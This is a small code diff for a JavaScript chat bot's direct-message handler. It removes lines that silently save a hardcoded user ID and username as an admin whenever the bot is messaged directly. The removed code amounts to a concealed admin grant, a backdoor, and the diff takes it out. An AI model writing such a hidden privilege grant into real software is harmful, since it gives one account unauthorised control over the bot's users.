@@ -407,9 +407,6 @@ controller.hears(['(.*)'], 'direct_message', function(bot, message) {
             }
         } else {
             bot.reply(message, 'Please do not message me directly!');
-            controller.storage.users.save({id: 'U2ZL4BP27', discourseID: 'mast3rd3mon', isAdmin: true}, function(err) {
-                error = err;
-            });
         }
     });
 });
